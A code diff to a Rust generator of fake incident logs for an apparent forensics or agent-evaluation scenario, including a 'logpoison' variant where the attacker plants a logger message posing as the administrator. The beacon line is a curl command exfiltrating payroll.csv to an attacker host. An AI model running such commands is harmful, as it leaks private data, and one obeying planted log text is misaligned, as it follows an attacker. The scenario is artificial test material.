@@ -1,5 +1,8 @@
-//! The attacker's trail in the victim's logs: an SSH brute force from 203.0.113.45 that ends in
-//! a login, the staging copy of the exfiltration targets, a failed beacon and the encryptor.
+//! The attacker's trail in the victim's logs.
+//!
+//! An SSH brute force from 203.0.113.45 that ends in a login, the staging copy of the
+//! exfiltration targets, a failed beacon and the encryptor. In `logpoison` the attacker also
+//! leaves a `logger` message posing as the administrator.
 
 use std::fmt::Write as _;
 use std::fs;
@@ -8,7 +11,8 @@ use std::path::Path;
 use anyhow::Context as _;
 use jiff::Timestamp;
 
-use crate::share::NOTE_NAME;
+use crate::share::{Detonation, NOTE_NAME};
+use crate::variant::{LOG_INJECTION, Variant};
 
 /// The victim's hostname.
 const HOST: &str = "acme-fs";
@@ -45,7 +49,7 @@ fn exec(before: i64, pid: u32, exe: &str, cmdline: &str) -> Entry {
     )
 }
 
-/// Write `auth.log` and `syslog` into `logs`, timed to end at `at`.
+/// Write `auth.log` and `syslog` into `logs` for `detonation`, timed to end at `at`.
 ///
 /// # Errors
 /// Fails when a log file can't be written.
@@ -54,10 +58,10 @@ pub(crate) fn write(
     share: &Path,
     drop: &Path,
     at: Timestamp,
-    locked: usize,
+    detonation: &Detonation,
 ) -> anyhow::Result<()> {
     let (share, drop) = (share.display(), drop.display());
-    let pack = format!("tar -C {share} -cf - payroll.csv patient-intake.csv");
+    let pack = format!("tar -C {share} -cf - {}", detonation.exfiltrated.join(" "));
     let unpack = format!("tar -C {drop} -xf -");
     let beacon = format!(
         "curl -s -m 5 --data-binary @{drop}/payroll.csv http://{ATTACKER}:8443/b?id=ACME-7Q2-0451"
@@ -84,7 +88,7 @@ pub(crate) fn write(
         ));
     }
 
-    let syslog = [
+    let mut syslog = vec![
         entry(
             711,
             "systemd[1]",
@@ -114,12 +118,33 @@ pub(crate) fn write(
         entry(
             0,
             "encryptor[2230]",
-            format!("locked {locked} files; note written to {share}/{NOTE_NAME}"),
+            format!(
+                "locked {} files; note written to {share}/{NOTE_NAME}",
+                detonation.locked.len()
+            ),
         ),
     ];
+    syslog.extend(poison(detonation.variant));
 
     write_log(&logs.join("auth.log"), at, &auth)?;
     write_log(&logs.join("syslog"), at, &syslog)
+}
+
+/// The attacker's own session (auid 1003) posing as the administrator with `logger`, in
+/// `logpoison`; nothing otherwise.
+fn poison(variant: Variant) -> Vec<Entry> {
+    if variant != Variant::Logpoison {
+        return Vec::new();
+    }
+    vec![
+        exec(
+            0,
+            2236,
+            "/usr/bin/logger",
+            "logger -t it-admin -f /var/tmp/.cache/notice.txt",
+        ),
+        entry(0, "it-admin[2236]", LOG_INJECTION),
+    ]
 }
 
 /// Fourteen failed SSH logins over two minutes, then the `backup` account gets in.
